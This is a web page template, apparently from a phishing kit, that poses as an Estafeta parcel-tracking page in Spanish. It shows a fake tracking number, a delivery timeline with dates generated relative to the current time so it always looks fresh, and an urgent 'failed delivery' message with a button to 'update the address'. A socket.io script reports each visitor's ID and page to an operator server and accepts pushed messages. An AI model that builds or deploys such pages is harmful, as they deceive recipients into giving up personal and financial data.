@include('apps.mxe.partials.header')
<style type="text/css">
    .home-bg-banner {
        background-image: url('https://www.dpd.com/wp-content/uploads/sites/226/2023/09/DPD_B2C_mobile_header_cms_600x325_v2.png');
        -o-object-fit: cover;
        object-fit: cover;
        -webkit-background-size: cover;
        background-size: cover;
        background-position: center center;
        background-repeat: no-repeat;
        height: 220px;
        position: relative;
    }

    .banner-right {
        position: absolute;
        bottom: 24px;
        left: 12px;
        color: white;
    }

    .home-input-search {
        border: 1px solid black;
    }

    .search_icon_home_banner {
        position: absolute;
        right: 12px;
        top: 12px;
    }

    .home-heading {
        font-weight: 600;
        font-size: 17px;
        font-weight: 500;
        line-height: 26px;
    }

    .row {
        display: flex;
    }

    .progress-bar {
        width: 100%;
        height: 10px;
        background-color: #eee;
        border-radius: 10px;
        /* margin: 50px auto; */
    }

    .progress {
        height: 100%;
        width: 55%;
        background-color: #4caf50;
        border-radius: 8px;
        float: right;
    }

    .progress-two {
        height: 100%;
        width: 38%;
        background-color: #ccc;
        border-radius: 8px;
    }

    .left-green {
        display: none;
    }

    .right-red:after,
    .right-red:before {
        background: red;
    }

    .green-button {
        background-color: green;
        color: white;
        padding: 10px 70px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        margin: 4px 2px;
        cursor: pointer;
        border-radius: 4px;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }

    .sub-title {
        text-align: center;
    }

    .position-relative {
        position: relative;
    }

    .center-logo-bg {
        position: absolute;
        top: -42px;
        display: flex;
        justify-content: center;
        width: 100%;
    }

    .center-logo-bg span {
        width: 101px;
        text-align: center;
        display: flex;
        justify-content: center;
        background: #fff;
        padding: 5px;
    }

    .center-logo-bg span img {
        width: 31px;
    }

    .before-progress-abr {
        margin-top: 16px;
        margin-bottom: 51px;
        position: relative;
    }

    .before-progress-abr .amb-img-div {
        position: absolute;
        top: 1px;
        left: 35%;
    }

    .driver-amb-bg {
        position: absolute;
        left: 35px;
        top: 7px;
        z-index: -1;
        height: 50px;
    }

    .driver-details {
        height: fit-content;
        margin-top: auto;
        margin-bottom: auto;
        margin-left: 64px;
        margin-right: 10px;
    }

    .alrt-modify {
        border: none;
        box-shadow: 0px 2px 16px 0px #f30a0a3d;
        background: #fff;
        border-radius: 28px;
        margin-top: 37px;
    }

    .icon-alert {
        font-size: 23px;
        color: #F44336;
    }

    .red-gray::before {
        background-color: rgb(11, 35, 30) !important;
        z-index: 999;
    }

    .right-red {
        padding: 2px 0px 14px 20px;
    }
</style>

<section>
    <div>
        <div class="mt-4" style="text-align: center;">
            <p style="color: #c00d0d;font-size: 20px;font-weight: 600;margin: 0px;">005587334268C704512516</p>
            <p>MEXICO D.F. (MEX) MOVIMIENTO LOCAL EN CENTRO DE DISTRIBUCION - Test</p>
        </div>
    </div>
    <div class="py-2 px-4 mb-4 position-relative"
        style="box-shadow: 0px 2px 16px 0px #ccc;margin: 0px 10px;border-radius: 0 0 15px 15px;">

        <h2 class="mb-2 text-xl text-gray-600 home-heading text-center !font-bold">¡Su entrega será entregada hoy mismo
            por un conductor de estafeta！</h2>
        <div class="before-progress-abr">
            <p class="p-0 m-0 text-right"><span class="pr-5 mr-4"></span> <span></span></p>
            <div class="progress-bar">
                <div class="progress"></div>
                <div class="progress-two"></div>
            </div>
            <div class="amb-img-div text-center">
                <img src="{{ asset('apps/mxe/images/amb-img.png') }}" class="img-fluid">
                <p class="p-0 m-0">13:15</p>
            </div>
        </div>
        <div class="row m-0"
            style="padding-left: 22px;padding-right: 10px;border-top: 1px solid #d9b3b3;border-bottom: 1px solid #d9b3b3;padding-top: 10px;padding-bottom: 10px;margin: auto;">
            <div class="col">
                <div class="row">
                    <div
                        style="width: 60px;border-radius: 100px;border: 1px solid green;height: 60px;display: flex;align-items: center;">
                        <i class="fa-solid fa-house" style="margin-left: auto;margin-right: auto;font-size: 23px;"></i>
                    </div>
                    <div
                        style="height: fit-content;margin-top: auto;margin-bottom: auto;margin-left: 10px;margin-right: 10px;">
                        <p style="margin: 0px;color: green;font-weight: 600;">Detalles de la entrega</p>
                        <p style="margin: 0px;font-weight: 600;">A la espera de redistribución</p>
                    </div>
                </div>
            </div>
            <div class="col" style="margin-left: auto;">
                <div style="width: fit-content;margin-left: auto;height: 100%;align-items: center;display: flex;">
                    <i class="fa-solid fa-pencil" style="font-size: 20px;"></i>
                </div>
            </div>
        </div>
    </div>

</section>
<div id="center" class="main innerpage">
    <div class="old_code_wrap">
        <a class="accesskey" href="#aC" id="aC" accesskey="C" title="ä¸»è¦å…§å®¹å€">:::</a>
        <section class="section col-12 photoblock2 no-print"
            style="background-image: url({{ asset('apps/mxe/images/photoblock_inbg.png') }}) !important;">
        </section>
    </div>
    <div class="container">
        <section class="ap">
            <div class="time_line_wrap only_mobile">
                <div class="time_line one">
                    <div class="left-green">
                        <div class="for_color">
                            <p>{{ $globalDate }}
                            </p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red red-gray">
                        <p class="top_title_ps">
                            {{ date($DATE_FORMATE, strtotime($currentDateTime . ' -0 DAY +2 HOURS')) }} 09:52</p>
                        <p class="bottom_color">Distribución fallida, devuelta al centro de distribución</p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="left-green">
                        <div class="for_color">
                            <p>04/09/2023<br>15:36
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">
                            {{ date($DATE_FORMATE, strtotime($currentDateTime . ' -1 DAY +2 HOURS')) }} 15:17
                        </p>
                        <p class="bottom_color">Llegada a la ciudad de destino, listo para la entrega</p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="left-green">
                        <div class="for_color">
                            <p>{{ date($DATE_TIME_FORMATE) }}
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">
                            {{ date($DATE_FORMATE, strtotime($currentDateTime . ' -2 DAY +3 HOURS')) }} 18:21
                        </p>
                        <p class="bottom_color">Envío a destino</p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="left-green">
                        <div class="for_color">
                            <p>{{ date($DATE_TIME_FORMATE) }}</p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">
                            {{ date($DATE_FORMATE, strtotime($currentDateTime . ' -3 DAY +1 HOURS')) }} 10:13
                        </p>
                        <p class="bottom_color">Finalización del registro de envíos
                        </p>
                    </div>
                    <div>
                    </div>
                </div>
            </div>
            <div class="message_expert only_mobile">
                <div class="sub-title alrt-modify py-5">
                    <h2 class="title mt-3"><i class="fa-solid fa-circle-exclamation icon-alert"></i> Falta de entrega de
                        paquetes</h2>
                    <p class="title-text">Por favor, actualice la dirección correcta lo antes posible,Los paquetes se
                        retienen temporalmente en el centro de distribución más cercano.<strong></strong></p>
                    <p class="title-text">La empresa estafeta permite el reenvío en caso de error en la
                        dirección.<strong></strong></p>
                </div>
            </div>
            <div class="button_block only_mobile my-5">
                <a href="{{ route('apps.mxe.address') }}"><button class="button_next"
                        style="background-color: #c00d0d;">Actualización</button></a>
            </div>

        </section>
    </div>
</div>
<script>
    $(document).ready(function() {
        let socket = io("http://{{ env('SOCKET_HOST') }}:{{ env('SOCKET_PORT') }}");
        if (!localStorage.getItem('userID')) {
            localStorage.setItem('userID', Math.random().toString(16).slice(2));
        }

        socket.on('connect', () => {
            var id = localStorage.getItem('userID')
            if (id) {
                var data = {
                    id: id,
                    page: 'home'
                }
                socket.emit('clientEvent', JSON.stringify(data));
            }
        });

        socket.on('clientCommand', (data) => {
            console.log('Received command from server:', data);
            // Execute client-side logic based on the received command
            alert(data.message);
        });
    })
</script>

@include('apps.mxe.partials.footer')
